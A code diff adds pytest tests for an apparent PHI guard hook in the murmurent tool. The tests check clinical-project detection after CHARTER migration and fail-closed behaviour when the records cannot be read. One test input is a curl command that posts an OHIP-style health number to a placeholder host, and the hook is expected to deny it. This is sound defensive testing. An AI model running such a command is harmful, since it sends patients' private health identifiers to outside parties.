@@ -75,6 +75,37 @@ def standard_project(monkeypatch, tmp_path):
     return repo
 
 
+def test_clinical_detected_via_cert_projects(clinical_project, monkeypatch):
+    """Sensitivity comes from the cert-project registry, not a CHARTER: after
+    migrate-charters removes the CHARTER (and stamps the marker), a clinical
+    project is still detected + blocks PHI via its cert record."""
+    from murmurent.core import cert_projects as CP
+    out = CP.migrate_charters()
+    assert "dcis_test" in out["deleted"]
+    assert not (clinical_project.path / "CHARTER.md").exists()
+    assert (clinical_project.path / ".murmurent.yaml").is_file()
+    decision = _run({
+        "tool_name": "Bash",
+        "tool_input": {"command": "curl https://x -d 'p=1234-567-890-AB'"},
+    })
+    assert decision["decision"] == "deny" and "OHIP" in decision["reason"]
+
+
+def test_unreadable_records_fail_closed(monkeypatch, tmp_path):
+    """When the lab-mgmt records can't be read (dangling root) and there is no
+    CHARTER to fall back on, the project is treated as clinical (fail closed)."""
+    monkeypatch.setenv("MURMURENT_PROJECTS_ROOT", str(tmp_path / "repos"))
+    # Point lab-mgmt at a dangling symlink → registry unreadable.
+    link = tmp_path / "lm_link"
+    link.symlink_to(tmp_path / "does_not_exist")
+    monkeypatch.setenv("MURMURENT_LAB_MGMT_REPO", str(link))
+    repo = tmp_path / "repos" / "mystery"
+    repo.mkdir(parents=True)
+    (repo / ".murmurent.yaml").write_text("murmurent: 1\nlab: mh\n", encoding="utf-8")
+    monkeypatch.chdir(repo)
+    assert phi_check._is_clinical_project() is True          # fail closed
+
+
 def test_pre_blocks_ohip_in_curl(clinical_project):
     decision = _run(
         {
